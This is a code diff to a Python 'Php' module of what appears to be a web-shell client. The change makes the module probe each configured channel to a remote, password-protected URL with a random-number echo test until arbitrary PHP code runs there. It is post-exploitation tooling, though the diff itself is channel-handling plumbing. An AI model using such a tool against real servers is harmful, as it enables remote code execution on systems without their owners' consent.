@@ -1,11 +1,11 @@
 from mako.template import Template
 from core.module import Module, Status
 from core import messages
-import utils
 from core.channels.channel import Channel
+from core import config
 from core.loggers import log, dlog
 import random
-
+import utils
 
 class Php(Module):
 
@@ -23,7 +23,7 @@ class Php(Module):
         )
 
         self.register_arguments([
-          { 'name' : 'command', 'help' : 'PHP code enclosed with brackets and terminated by semi-comma', 'nargs' : '+' },
+          { 'name' : 'command', 'help' : 'PHP code wrapped in quotes and terminated by semi-comma', 'nargs' : '+' },
           { 'name' : '-prefix-string', 'default' : '' },
           { 'name' : '-post_data' },
           { 'name' : '-postfix-string', 'default' : '' },
@@ -31,19 +31,15 @@ class Php(Module):
 
         self.channel = None
 
-    def setup(self, args={}):
-        """Instauration of the PHP channel. Returns the module status."""
-
-        self._instantiate_channel()
+    def _check_interpreter(self, channel):
 
         rand = str(random.randint(11111, 99999))
 
         command = 'echo(%s);' % rand
-        response, code = self.channel.send(command)
+        response, code = channel.send(command)
 
         if rand == response:
             status = Status.RUN
-            self.session['channel'] = self.channel.channel_name
         else:
             status = Status.FAIL
 
@@ -51,9 +47,42 @@ class Php(Module):
         # error code
         self._print_response_status(command, code, response)
 
+        return status
+
+
+    def setup(self, args={}):
+        """Instauration of the PHP channel. Returns the module status."""
+
+        # Return if already set. This check has to be done due to
+        # the slack initialization in run()
+        if self.channel: return
+
+        # Try a single channel if is manually set, else
+        # probe every the supported channel from config
+        if self.session.get('channel'):
+            channels = [ self.session['channel'] ]
+        else:
+            channels = config.channels
+
+        for channel_name in channels:
+
+            channel = Channel(
+                url = self.session['url'],
+                password = self.session['password'],
+                channel_name = channel_name
+            )
+
+            status = self._check_interpreter(channel)
+
+            if status == Status.RUN:
+                self.session['channel'] = channel_name
+                self.channel = channel
+                break
+
         log.debug(
-            'PHP setup and now %s' % (
-                'running' if status == Status.RUN else 'failed'
+            'PHP setup %s %s' % (
+                'running' if status == Status.RUN else 'failed',
+                'with %s channel' % (channel_name) if status == Status.RUN else ''
             )
         )
 
@@ -62,7 +91,9 @@ class Php(Module):
     def run(self, args):
         """ Run module """
 
-        self._instantiate_channel()
+        # This is an unusual slack setup at every execution
+        # to check and eventually instance the proper channel
+        self.setup()
 
         cwd = self._get_stored_result('cwd', module = 'file_cd', default = '.')
         chdir = '' if cwd == '.' else "chdir('%s');" % cwd
@@ -117,15 +148,3 @@ class Php(Module):
         if (command_last_chars and
               command_last_chars[-1] not in ( ';', '}' )):
             log.warn(messages.module_shell_php.missing_php_trailer_s % command_last_chars)
-
-    def _instantiate_channel(self):
-        """The channel presence check and eventual instantation has to be
-        done both in setup() than in run(), to have a slack instantiation"""
-
-        if self.channel: return
-
-        self.channel = Channel(
-            url = self.session['url'],
-            password = self.session['password'],
-            channel_name = self.session['channel']
-        )
